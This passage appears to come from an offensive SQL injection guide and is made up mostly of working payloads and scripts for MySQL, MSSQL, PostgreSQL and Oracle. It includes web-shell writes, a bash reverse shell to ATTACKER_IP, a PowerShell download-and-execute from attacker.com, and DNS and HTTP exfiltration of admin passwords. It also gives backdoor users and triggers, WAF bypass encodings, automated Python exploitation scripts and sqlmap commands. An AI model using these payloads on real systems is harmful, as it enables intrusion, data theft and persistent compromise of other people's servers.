'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/shell.php';--

# Execute commands using COPY FROM PROGRAM (PostgreSQL 9.3+)
'; COPY (SELECT '') FROM PROGRAM 'id';--
'; COPY (SELECT '') FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"';--

# Create table from command output
'; CREATE TABLE cmd_output(output text);--
'; COPY cmd_output FROM PROGRAM 'whoami';--
'; SELECT * FROM cmd_output;--

# Load extension for command execution
'; CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS 'lib_postgis-2.1.so', 'exec' LANGUAGE C STRICT;--
'; SELECT exec('id');--

# DNS exfiltration
'; COPY (SELECT '') FROM PROGRAM 'nslookup ' || (SELECT password FROM users WHERE username='admin') || '.attacker.com';--
```

**Oracle Stacked Queries**

Oracle supports stacked queries through PL/SQL blocks.

```sql
# Test for stacked queries
'; BEGIN DBMS_LOCK.SLEEP(5); END;--

# Create backdoor user
'; BEGIN EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY pass123'; END;--
'; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO hacker'; END;--

# Insert backdoor record
'; INSERT INTO users VALUES('hacker','password123','admin');--

# Execute system commands (requires Java permissions)
'; DECLARE
    l_output VARCHAR2(4000);
BEGIN
    l_output := DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec("id")');
END;--

# Create malicious procedure
'; CREATE OR REPLACE PROCEDURE backdoor(cmd IN VARCHAR2) AS
    l_result NUMBER;
BEGIN
    EXECUTE IMMEDIATE cmd;
END;--

'; EXEC backdoor('INSERT INTO users VALUES(''hacker'',''pass'',''admin'')')--

# DNS exfiltration using UTL_HTTP
'; DECLARE
    l_http_request UTL_HTTP.REQ;
    l_password VARCHAR2(100);
BEGIN
    SELECT password INTO l_password FROM users WHERE username='admin';
    l_http_request := UTL_HTTP.BEGIN_REQUEST('http://' || l_password || '.attacker.com');
    UTL_HTTP.END_REQUEST(l_http_request);
END;--

# File operations using UTL_FILE
'; DECLARE
    f UTL_FILE.FILE_TYPE;
BEGIN
    f := UTL_FILE.FOPEN('/tmp', 'shell.jsp', 'W');
    UTL_FILE.PUT_LINE(f, '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');
    UTL_FILE.FCLOSE(f);
END;--
```

**Advanced Stacked Query Techniques**

**Database-Specific Command Execution**

```sql
# MSSQL - Multiple command execution methods
# Method 1: xp_cmdshell
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--

# Method 2: Ole Automation
'; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami'--

# Method 3: SQL Agent Job (requires agent running)
'; EXEC msdb.dbo.sp_add_job @job_name = 'backdoor';--
'; EXEC msdb.dbo.sp_add_jobstep @job_name = 'backdoor', @step_name = 'step1', @subsystem = 'CMDEXEC', @command = 'whoami';--
'; EXEC msdb.dbo.sp_add_jobserver @job_name = 'backdoor';--
'; EXEC msdb.dbo.sp_start_job @job_name = 'backdoor';--

# PostgreSQL - Large object for file operations
'; SELECT lo_import('/etc/passwd', 12345);--
'; SELECT lo_export(12345, '/tmp/passwd_copy');--

# PostgreSQL - Custom C function
'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS $$
    import subprocess
    return subprocess.check_output(args[0], shell=True)
$$ LANGUAGE plpythonu;--
'; SELECT shell('id');--
```

**Data Exfiltration via Stacked Queries**

```sql
# MSSQL - DNS exfiltration
'; DECLARE @data VARCHAR(1000);
SELECT @data = (SELECT TOP 1 password FROM users WHERE username='admin');
EXEC('xp_cmdshell ''nslookup ' + @data + '.attacker.com''');--

# MSSQL - HTTP exfiltration
'; DECLARE @data VARCHAR(MAX);
SELECT @data = (SELECT username + ':' + password FROM users FOR XML PATH(''));
DECLARE @url VARCHAR(MAX) = 'http://attacker.com/?data=' + @data;
EXEC sp_oacreate 'MSXML2.ServerXMLHTTP', @obj OUT;
EXEC sp_oamethod @obj, 'open', NULL, 'GET', @url, false;
EXEC sp_oamethod @obj, 'send';--

# PostgreSQL - HTTP exfiltration (requires dblink extension)
'; CREATE EXTENSION IF NOT EXISTS dblink;--
'; SELECT * FROM dblink('host=attacker.com user=test password=' || (SELECT password FROM users WHERE username='admin'), 'SELECT 1');--

# MySQL - DNS exfiltration using LOAD_FILE with UNC path (Windows only)
'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\share\\file'));--
```

**Persistence via Stacked Queries**

```sql
# MSSQL - Create trigger backdoor
'; CREATE TRIGGER backdoor_trigger
ON users
AFTER INSERT
AS
BEGIN
    DECLARE @cmd VARCHAR(8000);
    SELECT @cmd = cmd FROM inserted;
    EXEC(@cmd);
END;--

# Usage: Insert into users table with malicious cmd value
'; INSERT INTO users(username,password,cmd) VALUES('test','test','EXEC xp_cmdshell ''whoami''');--

# PostgreSQL - Create trigger backdoor
'; CREATE OR REPLACE FUNCTION backdoor_func() RETURNS TRIGGER AS $$
BEGIN
    PERFORM pg_sleep(5);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;--

'; CREATE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
EXECUTE FUNCTION backdoor_func();--

# Oracle - Create trigger backdoor
'; CREATE OR REPLACE TRIGGER backdoor_trigger
AFTER INSERT ON users
FOR EACH ROW
BEGIN
    DBMS_LOCK.SLEEP(5);
END;--
```

**Stacked Query Detection Script**

```python
import requests
import time

class StackedQueryTester:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        
    def test_stacked_queries(self, db_type='unknown'):
        """Test if stacked queries are supported"""
        
        test_payloads = {
            'mysql': "'; SELECT SLEEP(5)-- -",
            'mssql': "'; WAITFOR DELAY '0:0:5'--",
            'postgres': "'; SELECT pg_sleep(5)--",
            'oracle': "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"
        }
        
        if db_type != 'unknown' and db_type in test_payloads:
            payloads = {db_type: test_payloads[db_type]}
        else:
            payloads = test_payloads
        
        for db, payload in payloads.items():
            print(f"Testing {db} stacked queries...")
            
            params = {self.param: payload}
            start = time.time()
            
            try:
                requests.get(self.url, params=params, timeout=7)
                elapsed = time.time() - start
                
                if elapsed >= 4:
                    print(f"[+] Stacked queries supported ({db})")
                    return db
                else:
                    print(f"[-] No delay detected for {db}")
            except requests.exceptions.Timeout:
                print(f"[+] Stacked queries likely supported ({db}) - timeout")
                return db
        
        print("[-] Stacked queries not supported")
        return None
    
    def exploit_stacked_query(self, db_type, attack_type='create_user'):
        """Execute various attacks using stacked queries"""
        
        attacks = {
            'mysql': {
                'create_user': "'; INSERT INTO users(username,password,role) VALUES('hacker',MD5('pass123'),'admin')-- -",
                'update_password': "'; UPDATE users SET password=MD5('newpass') WHERE username='admin'-- -"
            },
            'mssql': {
                'enable_xp_cmdshell': "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--",
                'create_user': "'; INSERT INTO users(username,password,role) VALUES('hacker','5f4dcc3b5aa765d61d8327deb882cf99','admin')--",
                'command_exec': "'; EXEC xp_cmdshell 'whoami'--"
            },
            'postgres': {
                'create_user': "'; INSERT INTO users(username,password,role) VALUES('hacker','password123','admin')--",
                'read_file': "'; CREATE TABLE file_data(data text); COPY file_data FROM '/etc/passwd'; SELECT * FROM file_data--",
                'command_exec': "'; COPY (SELECT '') FROM PROGRAM 'id'--"
            },
            'oracle': {
                'create_user': "'; INSERT INTO users VALUES('hacker','password123','admin')--",
                'sleep': "'; BEGIN DBMS_LOCK.SLEEP(5); END;--"
            }
        }
        
        if db_type in attacks and attack_type in attacks[db_type]:
            payload = attacks[db_type][attack_type]
            params = {self.param: payload}
            
            print(f"Executing {attack_type} on {db_type}...")
            response = requests.get(self.url, params=params)
            
            print(f"Response status: {response.status_code}")
            return response
        else:
            print(f"Attack type '{attack_type}' not available for {db_type}")
            return None

# Usage
tester = StackedQueryTester(
    url="http://target.com/product.php",
    param="id"
)

# Detect database and stacked query support
db_type = tester.test_stacked_queries()

if db_type:
    # Execute appropriate attack
    if db_type == 'mssql':
        tester.exploit_stacked_query('mssql', 'enable_xp_cmdshell')
        tester.exploit_stacked_query('mssql', 'command_exec')
    elif db_type == 'postgres':
        tester.exploit_stacked_query('postgres', 'command_exec')
```

### Database-Specific SQL Injection Techniques

**MySQL-Specific Features**

```sql
# Information gathering
SELECT @@version;
SELECT @@version_comment;
SELECT @@hostname;
SELECT @@datadir;
SELECT @@basedir;
SELECT @@tmpdir;
SELECT @@log_error;
SELECT USER();
SELECT CURRENT_USER();
SELECT SYSTEM_USER();
SELECT DATABASE();

# Check file privileges
SELECT file_priv FROM mysql.user WHERE user='current_user';
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE';

# Read files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
SELECT LOAD_FILE(0x2f6574632f706173737764);  # Hex encoded path

# Write files (requires FILE privilege)
SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET[0]); ?>' INTO DUMPFILE '/var/www/html/shell.php';

# Log file poisoning
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET[0]); ?>';

# Bypass quotes using hex
SELECT * FROM users WHERE username=0x61646d696e;  # admin

# Charset-based bypass
SELECT * FROM users WHERE username=_latin1 0x61646d696e COLLATE latin1_general_cs;

# Alternative comment syntax
SELECT * FROM users WHERE id=1 /*!50000AND 1=1*/;
SELECT * FROM users WHERE id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3;

# Version-specific comments
/*!32302 UNION SELECT 1,2,3 */  # MySQL 3.23.02+
/*!40000 UNION SELECT 1,2,3 */  # MySQL 4.00.00+
/*!50000 UNION SELECT 1,2,3 */  # MySQL 5.00.00+
```

**MSSQL-Specific Features**

```sql
# Information gathering
SELECT @@VERSION;
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('Edition');
SELECT SYSTEM_USER;
SELECT SUSER_SNAME();
SELECT USER_NAME();
SELECT DB_NAME();
SELECT HOST_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_MEMBER('db_owner');

# Database enumeration
SELECT name FROM sys.databases;
SELECT name FROM master..sysdatabases;

# User enumeration
SELECT name FROM sys.server_principals WHERE type='S';
SELECT name,password_hash FROM sys.sql_logins;

# Linked servers
SELECT * FROM sys.servers;
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

# Execute on linked server
SELECT * FROM OPENQUERY(LinkedServer, 'SELECT @@VERSION');
EXEC('SELECT @@VERSION') AT LinkedServer;

# Current user permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

# xp_cmdshell status
SELECT value FROM sys.configurations WHERE name='xp_cmdshell';

# Enable advanced options and xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Command execution alternatives
# Using xp_dirtree for DNS exfiltration
EXEC master..xp_dirtree '\\attacker.com\share';
DECLARE @data VARCHAR(1000);
SELECT @data = password FROM users WHERE username='admin';
EXEC master..xp_dirtree '\\' + @data + '.attacker.com\share';

# Using xp_fileexist
EXEC master..xp_fileexist '\\attacker.com\share\file';

# Reading files using OPENROWSET
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;

# Alternative reading with OPENROWSET
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\boot.ini', SINGLE_BLOB) AS x;

# Write to file using BCP
EXEC master..xp_cmdshell 'bcp "SELECT ''<?php system($_GET[0]); ?>'' " queryout C:\inetpub\wwwroot\shell.php -c -T';

# Bypass quote filtering
SELECT * FROM users WHERE username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110);  # admin
```

**Oracle-Specific Features**

```sql
# Information gathering
SELECT * FROM v$version;
SELECT * FROM v$instance;
SELECT USER FROM dual;
SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual;
SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;
SELECT SYS_CONTEXT('USERENV','HOST') FROM dual;
SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual;
SELECT SYS_CONTEXT('USERENV','SERVER_HOST') FROM dual;

# Check DBA privileges
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;
SELECT grantee,granted_role FROM dba_role_privs WHERE grantee=USER;

# Database enumeration
SELECT name FROM v$database;
SELECT * FROM all_users;
SELECT * FROM dba_users;

# Table enumeration (current user)
SELECT table_name FROM user_tables;
SELECT table_name FROM all_tables WHERE owner='HR';

# Column enumeration
SELECT column_name FROM user_tab_columns WHERE table_name='USERS';
SELECT column_name,data_type FROM all_tab_columns WHERE table_name='USERS' AND owner='HR';

# Handling multiple rows (no LIMIT clause in Oracle)
SELECT username FROM (SELECT username, ROWNUM r FROM users) WHERE r=1;
SELECT username FROM (SELECT username, ROWNUM r FROM users) WHERE r=2;

# Alternative with ROW_NUMBER()
SELECT username FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn FROM users) WHERE rn=1;

# String concatenation
SELECT username||':'||password FROM users;

# Out-of-band techniques
# DNS exfiltration
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual;

# HTTP exfiltration
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual;

# HTTPURITYPE for data exfiltration
SELECT HTTPURITYPE('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)).getclob() FROM dual;

# Reading files (requires Java permissions)
SELECT UTL_FILE.GET_LINE('DIRECTORY_NAME', 'filename.txt') FROM dual;

# Command execution via Java stored procedures
# Create Java source
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Execute" AS
import java.io.*;
public class Execute {
    public static String run(String cmd) throws IOException {
        StringBuffer output = new StringBuffer();
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line = "";
        while ((line = reader.readLine())!= null) {
            output.append(line + "\n");
        }
        return output.toString();
    }
};
/

# Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION run_cmd(cmd IN VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'Execute.run(java.lang.String) return java.lang.String';
/

# Execute commands
SELECT run_cmd('whoami') FROM dual;

# Bypass quote filtering using CHR
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);  # admin
```

**PostgreSQL-Specific Features**

```sql
# Information gathering
SELECT version();
SELECT current_user;
SELECT current_database();
SELECT inet_server_addr();
SELECT inet_server_port();

# Check superuser status
SELECT usesuper FROM pg_user WHERE usename=current_user;

# Database enumeration
SELECT datname FROM pg_database;

# Schema enumeration
SELECT schema_name FROM information_schema.schemata;

# Table enumeration
SELECT tablename FROM pg_tables WHERE schemaname='public';
SELECT table_name FROM information_schema.tables WHERE table_schema='public';

# Column enumeration
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users';

# Large objects (file operations)
SELECT lo_import('/etc/passwd');  # Returns OID
SELECT lo_export(12345, '/tmp/passwd_copy');

# Reading files (requires superuser or pg_read_file role)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 100);  # offset, length

# Reading binary files
SELECT pg_read_binary_file('/bin/ls');

# Directory listing
SELECT pg_ls_dir('/etc');

# Command execution via COPY FROM PROGRAM
COPY (SELECT '') FROM PROGRAM 'id';
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;

# Command execution via custom function
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('id');

# Command execution via PL/Python
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpythonu;

SELECT exec_cmd('id');

# DNS exfiltration via COPY FROM PROGRAM
COPY (SELECT '') FROM PROGRAM 'nslookup ' || (SELECT password FROM users WHERE username='admin') || '.attacker.com';

# Bypass quote filtering
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);  # admin

# Array operations
SELECT ARRAY_AGG(username||':'||password) FROM users;

# JSON operations
SELECT json_agg(row_to_json(t)) FROM (SELECT * FROM users) t;
```

### WAF Bypass Techniques

**General Bypass Methods**

```sql
# Case variation
UNION SELECT
UnIoN SeLeCt
uNiOn sElEcT

# Comment injection
UNION/**/SELECT
UNION/*comment*/SELECT/*comment*/1,2,3
UNION%23comment%0ASELECT%231,2,3

# Whitespace alternatives
UNION%20SELECT
UNION%09SELECT  # Tab
UNION%0ASELECT  # Newline
UNION%0DSELECT  # Carriage return
UNION%0BSELECT  # Vertical tab
UNION%A0SELECT  # Non-breaking space

# Parentheses
UNION(SELECT(1),2,3)
UNION%28SELECT%281%29,2,3%29

# Plus sign instead of space (URL encoding)
UNION+SELECT+1,2,3

# Inline comments (MySQL)
UNION/*!50000SELECT*/1,2,3
/*!50000UNION*//*!50000SELECT*//*!50000*/1,2,3

# Alternative operators
AND 1=1
&& 1=1
AND BINARY 1=1

OR 1=1
|| 1=1
OR BINARY 1=1

# Encoding
# URL encoding
%55%4E%49%4F%4E%20%53%45%4C%45%43%54  # UNION SELECT

# Double URL encoding
%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554

# Unicode encoding
\u0055\u004E\u0049\u004F\u004E\u0020\u0053\u0045\u004C\u0045\u0043\u0054

# Hex encoding (MySQL)
SELECT 0x61646d696e;  # admin

# Buffer overflow bypass
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,...  # Very long payload
```

**Keyword Bypass**

```sql
# UNION alternatives
UNION SELECT UNIUNIONON SELECT # Becomes UNION after filter removes "UNION" /_!12345UNION_/ /_!50000UNION_/SELECT

# SELECT alternatives

SEL<>ECT SELECT[0x09]1,2,3 SELECT(1),2,3 SEL%00ECT

# WHERE alternatives

WHERE 1=1 HAVING 1=1 WHERE BINARY 1=1

# Bypass using concatenation

'UNI'+'ON' 'SEL'+'ECT' # MSSQL 'UNI'||'ON'||' '||'SEL'||'ECT' # Oracle CONCAT('UNI','ON',' ','SEL','ECT') # MySQL

# Scientific notation (MySQL)

SELECT 1e0FROM users; SELECT 1.e0FROM users;

# Hexadecimal numbers

SELECT 0x1 FROM users; SELECT 0x61646d696e; # admin

# Null byte injection (legacy)

UNION%00SELECT SELECT%00FROM

````

**Filter Evasion Techniques**

```sql
# Equals sign bypass
' OR 1 LIKE 1-- -
' OR 'a' LIKE 'a'-- -
' OR 1 REGEXP 1-- -
' OR 'admin' REGEXP 'admin'-- -
' OR 1 IN (1)-- -
' OR 1 BETWEEN 0 AND 2-- -

# Quote bypass
# Use hex (MySQL)
SELECT * FROM users WHERE username=0x61646d696e;

# Use CHAR (MSSQL)
SELECT * FROM users WHERE username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110);

# Use CHR (Oracle/PostgreSQL)
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);

# Space bypass
SELECT/**/1,2,3/**/FROM/**/users;
SELECT(1),(2),(3)FROM(users);
SELECT{1},{2},{3}FROM{users};  # MySQL
SELECT+1,2,3+FROM+users;
SELECT%09 1,2,3%09FROM%09users;

# Comma bypass in UNION
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c;
UNION SELECT 1,2,3 FROM DUAL;  # Oracle requires FROM

# Comma bypass in LIMIT (MySQL)
SELECT * FROM users LIMIT 1 OFFSET 0;
SELECT * FROM users LIMIT 0,1;

# Comment syntax variations
-- (space required)
--+
#
/**/
/*!50000*/
;%00

# AND/OR bypass
' || '1'='1
' && '1'='1
' | '1
' & '1
````

**Advanced WAF Bypass**

```sql
# HPP (HTTP Parameter Pollution)
# Send: ?id=1&id=' UNION SELECT 1,2,3-- -
# Some WAFs check first parameter, backend uses last

# Content-Type manipulation
# Change to: application/json
{"id": "1' UNION SELECT 1,2,3-- -"}

# X-Forwarded-For header injection
X-Forwarded-For: 127.0.0.1' UNION SELECT 1,2,3-- -

# Multipart form data
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1' UNION SELECT 1,2,3-- -
------WebKitFormBoundary--

# Case when statement
' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- -

# MySQL alternative syntax
SELECT{x table_name}FROM{x information_schema.tables};

# Version-specific parsing
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3;

# Buffer overflow
id=1' AAAAAAAA[...many As...]AAAAA' UNION SELECT 1,2,3-- -

# Chunked encoding
# Split payload across multiple chunks
# Requires control over HTTP layer

# Unicode normalization
# Use alternative unicode representations
# '\u0027' = '
# '\u0022' = "

# NULL byte injection (legacy systems)
' UNION%00SELECT%001,2,3-- -
```

### Comprehensive SQLi Exploitation Script

```python
import requests
import time
import re
from urllib.parse import quote

class AdvancedSQLi:
    def __init__(self, url, param, db_type='mysql', method='GET'):
        self.url = url
        self.param = param
        self.db_type = db_type.lower()
        self.method = method.upper()
        self.session = requests.Session()
        
    def send_payload(self, payload):
        """Send SQL injection payload"""
        if self.method == 'GET':
            params = {self.param: payload}
            response = self.session.get(self.url, params=params)
        else:  # POST
            data = {self.param: payload}
            response = self.session.post(self.url, data=data)
        
        return response
    
    def detect_injection_type(self):
        """Detect which injection type works"""
        print("[*] Testing for SQL injection types...")
        
        # Test Boolean-based
        true_payload = "' OR '1'='1'-- -"
        false_payload = "' OR '1'='2'-- -"
        
        true_response = self.send_payload(true_payload)
        false_response = self.send_payload(false_payload)
        
        if len(true_response.text) != len(false_response.text):
            print("[+] Boolean-based SQLi detected")
            return 'boolean'
        
        # Test Time-based
        delays = {
            'mysql': "' AND SLEEP(5)-- -",
            'mssql': "'; WAITFOR DELAY '0:0:5'--",
            'postgres': "' AND pg_sleep(5)--",
            'oracle': "' AND DBMS_LOCK.SLEEP(5)-- "
        }
        
        start = time.time()
        self.send_payload(delays.get(self.db_type, delays['mysql']))
        elapsed = time.time() - start
        
        if elapsed >= 4:
            print("[+] Time-based SQLi detected")
            return 'time'
        
        # Test Union-based
        union_test = "' UNION SELECT NULL-- -"
        union_response = self.send_payload(union_test)
        
        if "syntax" not in union_response.text.lower():
            print("[+] Union-based SQLi detected")
            return 'union'
        
        # Test Error-based
        error_payloads = {
            'mysql': "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -",
            'mssql': "' AND 1=CONVERT(INT,@@VERSION)--",
            'postgres': "' AND 1=CAST(VERSION() AS INT)--",
            'oracle': "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(USER)--"
        }
        
        error_response = self.send_payload(error_payloads.get(self.db_type, error_payloads['mysql']))
        
        if any(marker in error_response.text for marker in ['~', 'Conversion', 'invalid', 'unknown host']):
            print("[+] Error-based SQLi detected")
            return 'error'
        
        print("[-] No SQLi detected")
        return None
    
    def find_column_count(self):
        """Find number of columns using ORDER BY or UNION"""
        print("[*] Finding number of columns...")
        
        # Method 1: ORDER BY
        for i in range(1, 20):
            payload = f"' ORDER BY {i}-- -"
            response = self.send_payload(payload)
            
            if "error" in response.text.lower() or response.status_code == 500:
                print(f"[+] Found {i-1} columns using ORDER BY")
                return i - 1
        
        # Method 2: UNION SELECT NULL
        for i in range(1, 20):
            nulls = ','.join(['NULL'] * i)
            
            if self.db_type == 'oracle':
                payload = f"' UNION SELECT {nulls} FROM dual-- -"
            else:
                payload = f"' UNION SELECT {nulls}-- -"
            
            response = self.send_payload(payload)
            
            if "error" not in response.text.lower() and response.status_code == 200:
                print(f"[+] Found {i} columns using UNION")
                return i
        
        return 0
    
    def extract_databases(self, columns):
        """Extract database names using UNION"""
        print("[*] Extracting databases...")
        
        databases = []
        position = self.find_injectable_column(columns)
        
        if self.db_type == 'mysql':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'schema_name')} FROM information_schema.schemata-- -"
        elif self.db_type == 'mssql':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'name')} FROM sys.databases--"
        elif self.db_type == 'postgres':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'datname')} FROM pg_database--"
        elif self.db_type == 'oracle':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'DISTINCT owner')} FROM all_tables--"
        
        response = self.send_payload(payload)
        
        # Extract database names from response
        # [Inference] Pattern matching would depend on application output
        patterns = [r'([a-zA-Z0-9_]+)']
        for pattern in patterns:
            matches = re.findall(pattern, response.text)
            databases.extend(matches)
        
        databases = list(set(databases))
        print(f"[+] Found databases: {databases}")
        return databases
    
    def extract_tables(self, database, columns):
        """Extract table names"""
        print(f"[*] Extracting tables from {database}...")
        
        position = self.find_injectable_column(columns)
        
        if self.db_type == 'mysql':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'table_name')} FROM information_schema.tables WHERE table_schema='{database}'-- -"
        elif self.db_type == 'mssql':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'table_name')} FROM information_schema.tables WHERE table_catalog='{database}'--"
        elif self.db_type == 'postgres':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'tablename')} FROM pg_tables WHERE schemaname='{database}'--"
        elif self.db_type == 'oracle':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'table_name')} FROM all_tables WHERE owner='{database.upper()}'--"
        
        response = self.send_payload(payload)
        
        # Extract table names
        tables = []
        patterns = [r'([a-zA-Z0-9_]+)']
        for pattern in patterns:
            matches = re.findall(pattern, response.text)
            tables.extend(matches)
        
        tables = list(set(tables))
        print(f"[+] Found tables: {tables}")
        return tables
    
    def extract_columns(self, table, columns):
        """Extract column names"""
        print(f"[*] Extracting columns from {table}...")
        
        position = self.find_injectable_column(columns)
        
        if self.db_type in ['mysql', 'mssql', 'postgres']:
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'column_name')} FROM information_schema.columns WHERE table_name='{table}'-- -"
        elif self.db_type == 'oracle':
            payload = f"' UNION SELECT {self.build_union_payload(columns, position, 'column_name')} FROM all_tab_columns WHERE table_name='{table.upper()}'--"
        
        response = self.send_payload(payload)
        
        # Extract column names
        cols = []
        patterns = [r'([a-zA-Z0-9_]+)']
        for pattern in patterns:
            matches = re.findall(pattern, response.text)
            cols.extend(matches)
        
        cols = list(set(cols))
        print(f"[+] Found columns: {cols}")
        return cols
    
    def extract_data(self, table, column, num_columns):
        """Extract data from specific column"""
        print(f"[*] Extracting data from {table}.{column}...")
        
        position = self.find_injectable_column(num_columns)
        
        payload = f"' UNION SELECT {self.build_union_payload(num_columns, position, column)} FROM {table}-- -"
        
        response = self.send_payload(payload)
        
        print(f"[+] Data extracted (check response)")
        return response.text
    
    def build_union_payload(self, total_columns, inject_position, inject_value):
        """Build UNION SELECT payload with injection at specific position"""
        parts = []
        for i in range(1, total_columns + 1):
            if i == inject_position:
                parts.append(inject_value)
            else:
                parts.append('NULL')
        
        return ','.join(parts)
    
    def find_injectable_column(self, columns):
        """Find which column position is reflected in output"""
        print("[*] Finding injectable column...")
        
        for i in range(1, columns + 1):
            payload = f"' UNION SELECT {self.build_union_payload(columns, i, str(i))}-- -"
            response = self.send_payload(payload)
            
            if str(i) in response.text:
                print(f"[+] Column {i} is injectable")
                return i
        
        return 1  # Default to first column
    
    def full_exploitation(self):
        """Perform full SQL injection exploitation"""
        print("\n[*] Starting full SQL injection exploitation")
        print(f"[*] Target: {self.url}")
        print(f"[*] Parameter: {self.param}")
        print(f"[*] Database: {self.db_type}")
        print(f"[*] Method: {self.method}\n")
        
        # Detect injection type
        inj_type = self.detect_injection_type()
        
        if not inj_type:
            print("[-] Target doesn't appear vulnerable")
            return
        
        if inj_type in ['union', 'error']:
            # Find column count
            columns = self.find_column_count()
            
            if columns == 0:
                print("[-] Could not determine column count")
                return
            
            # Extract databases
            databases = self.extract_databases(columns)
            
            # For each database, extract tables
            for db in databases[:3]:  # Limit to first 3 databases
                tables = self.extract_tables(db, columns)
                
                # For each table, extract columns and data
                for table in tables[:5]:  # Limit to first 5 tables
                    cols = self.extract_columns(table, columns)
                    
                    # Extract data from first column
                    if cols:
                        self.extract_data(table, cols[0], columns)

# Usage example
if __name__ == "__main__":
    # MySQL example
    sqli = AdvancedSQLi(
        url="http://target.com/product.php",
        param="id",
        db_type="mysql",
        method="GET"
    )
    
    sqli.full_exploitation()
    
    # Alternatively, use specific techniques
    # columns = sqli.find_column_count()
    # databases = sqli.extract_databases(columns)
    # tables = sqli.extract_tables('testdb', columns)
    # data = sqli.extract_data('users', 'password', columns)
```

### SQLmap Usage for Comprehensive Testing

```bash
# Basic scan
sqlmap -u "http://target.com/product.php?id=1"

# Specify parameter
sqlmap -u "http://target.com/product.php?id=1" -p id

# POST request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"

# From Burp request file
sqlmap -r request.txt

# Specify database type
sqlmap -u "http://target.com/product.php?id=1" --dbms=mysql

# Enumerate databases
